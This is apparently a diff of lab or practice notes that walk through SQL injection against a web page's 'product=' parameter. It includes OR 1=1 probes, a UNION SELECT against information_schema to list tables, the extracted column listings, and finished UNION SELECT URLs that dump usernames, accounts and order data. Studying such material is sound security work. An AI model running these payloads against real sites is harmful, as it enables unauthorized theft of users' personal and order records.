@@ -74,10 +74,23 @@ Open the web server
 - take not of everything past the question mark. Your selection field is "product=" as you can see from the url.
 - gradually begin increasing the number after that equal sign until you get a table that includes everything. that is your vulnerable field. (ex: product=1 OR 1=1    product=2 OR 1=1    product=3 OR 1=1    product=4 OR 1=1)
 - after we find this field we run our golden statement. product=7 UNION SELECT Table_schema,Column_name,table_name FROM Information_schema.columns
-- scroll down the results until you seed man made inputs that seem suspicous
+- scroll down the results until you seed man made inputs that seem sus
 
-mysql 	user 	$Password
-mysql 	user 	$Select_priv
-mysql 	user 	$Insert_priv
-mysql 	user 	$Update_priv
-mysql 	user 	$Delete_priv
+siteusers 	id 	      $purchase_history
+siteusers 	quantity 	$purchase_history
+siteusers 	product 	$purchase_history
+siteusers 	account 	$purchase_history
+siteusers 	id       	$shippingdates
+siteusers 	ordernumber 	$shippingdates
+siteusers 	account 	$shippingdates
+siteusers 	date     	$shippingdates
+siteusers 	user_id 	$users
+siteusers 	name 	    $users
+siteusers 	username 	$users
+
+- now we can use these fields to create a custom search
+
+                                                         column,column,column FROM Database.Table
+          <URL>/pick.php?product=7 UNION SELECT user_id,name,username FROM siteusers.users
+          <URL>/pick.php?product=7 UNION SELECT ordernumber,account,date FROM siteusers.shippingdates
+          <URL>/pick.php?product=7 UNION SELECT id,quantity,product FROM siteusers.purchase_history
